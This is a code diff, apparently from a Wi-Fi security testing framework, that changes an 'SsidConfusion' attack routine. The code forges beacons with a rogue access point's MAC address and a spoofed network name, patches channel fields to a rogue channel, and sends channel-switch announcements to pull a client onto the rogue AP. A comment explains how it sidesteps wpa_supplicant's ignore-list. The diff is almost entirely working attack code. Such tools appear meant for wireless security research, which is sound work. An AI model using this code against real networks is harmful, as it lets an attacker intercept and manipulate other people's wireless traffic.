@@ -20,21 +20,22 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     const HWAddress<6> rogue_ap_mac(rogue_ap.get(SK::permanent_mac));
     const HWAddress<6> client_perm(sta.get(SK::permanent_mac));
 
-    // Scan for WrongNet beacon on ch 11 — template for CSA + confused beacon
+    // Scan for WrongNet beacon on ch 11.
+    // beacon stays as WrongNet — send_csa_beacon() uses it as CSA template on real channel.
 	setup_real_AP_RSN_frames();
 
-    // Build confused beacon: rogue_ap_mac BSSID + SafeNet SSID, ch IEs patched to rogue channel.
+    // Build confused beacon separately: rogue_ap_mac BSSID + SafeNet SSID, ch IEs patched to rogue channel.
     // Using rogue_ap_mac avoids wpa_supplicant's 10s ignore-list that fires after CSA disconnect.
-    beacon = make_confused_beacon(*beacon, confused_ssid, false);
-    beacon->addr2(rogue_ap_mac);
-    beacon->addr3(rogue_ap_mac);
-    if(auto *ch_ie = beacon->search_option(Dot11ManagementFrame::DS_SET))
+    auto confused_beacon = make_confused_beacon(*beacon, confused_ssid, false);
+    confused_beacon->addr2(rogue_ap_mac);
+    confused_beacon->addr3(rogue_ap_mac);
+    if(auto *ch_ie = confused_beacon->search_option(Dot11ManagementFrame::DS_SET))
         const_cast<uint8_t *>(ch_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
-    if(auto *ht_ie = beacon->search_option(Dot11ManagementFrame::HT_OPERATION)) {
+    if(auto *ht_ie = confused_beacon->search_option(Dot11ManagementFrame::HT_OPERATION)) {
         if(ht_ie->data_size() >= 1)
             const_cast<uint8_t *>(ht_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
     }
-    probe_resp = std::make_unique<Tins::Dot11ProbeResponse>(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
+    probe_resp = std::make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*confused_beacon, netconfig.rogue_channel));
 
     // BPF: AP + client traffic only
 	const string bpf = "(wlan type data or mgt) and (wlan host " + ap.get(SK::permanent_mac) + " or wlan host " +
@@ -74,7 +75,6 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 
     const auto start      = steady_clock::now();
     auto next_beacon      = steady_clock::now();
-    auto last_real_beacon = steady_clock::now();
     int  csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
 
     while(true) {
@@ -105,7 +105,7 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     	}
 
 		if(next_beacon <= steady_clock::now()) {
-            send_to_rogue(*beacon);
+            send_to_rogue(*confused_beacon);
             RadioTap csa = CSA_attack::get_CSA_beacon(ap.get(SK::mac),
             	netconfig.real_channel, netconfig.rogue_channel,
             	csa_count, beacon.get());
@@ -113,11 +113,6 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
                 if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
             next_beacon += milliseconds(beacon_ms);
         }
-
-        /*if(last_real_beacon + seconds(beacon_warn_sec) < steady_clock::now()) {
-            log(LogLevel::WARNING, "No beacon from WrongNet AP for {}s", beacon_warn_sec);
-            last_real_beacon = steady_clock::now();
-        }*/
     }
     rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	hw_capabilities::run_cmd({ "iw", "dev", nic_client_ack, "del" }, netns, true);
